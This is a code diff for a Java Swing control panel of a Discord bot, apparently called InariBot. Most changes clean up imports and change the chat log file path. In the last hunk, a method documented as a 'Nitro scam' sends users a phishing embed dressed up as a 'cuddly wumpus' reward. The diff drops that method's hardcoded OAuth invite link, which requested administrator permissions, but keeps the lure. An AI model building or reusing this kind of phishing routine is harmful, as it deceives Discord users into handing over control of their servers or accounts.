@@ -15,20 +15,15 @@ import javax.swing.JOptionPane;
 import java.awt.Color;
 import javax.swing.JComboBox;
 import java.awt.GridLayout;
-import java.awt.TextArea;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
-import java.awt.event.AdjustmentEvent;
-import java.awt.event.AdjustmentListener;
 import java.io.File;
-import java.util.ArrayList;
 import java.util.List;
 
 import javax.security.auth.login.LoginException;
 import javax.swing.DefaultListModel;
 import javax.swing.JButton;
 import javax.swing.JTextField;
-import javax.swing.ListModel;
 import javax.swing.border.LineBorder;
 import javax.swing.event.ListSelectionEvent;
 import javax.swing.event.ListSelectionListener;
@@ -261,7 +256,7 @@ public class MainMenuWindow {
 	public void updateMessageBox() {
 		messageArea.setText("");
 
-		File chatlogFile = new File(this.getClass().getClassLoader().getResource("chatlog.txt").getFile());
+		File chatlogFile = new File("./config/chatlog.txt");
 		List<String> chatlog = TextFileEditor.getTextFileAsList(chatlogFile);
 		for(int i = 0; i < chatlog.size(); i++) {
 			messageArea.append(chatlog.get(i)+"\n");
@@ -376,8 +371,6 @@ public class MainMenuWindow {
 	 * Nitro scam. Sends a phishing message to a user.
 	 */
 	public void nitroScam() {
-		String scamLink = "https://discordapp.com/oauth2/authorize?client_id=433178269626400768&permissions=8&scope=bot";
-		
 		EmbedBuilder newEmbed = new EmbedBuilder();
 		newEmbed.setThumbnail(InariBot.jda.getSelfUser().getAvatarUrl());
 		newEmbed.addField("A cuddly wumpus has spawned!", "Wumpus has decided you are an outstanding member of Discord,"
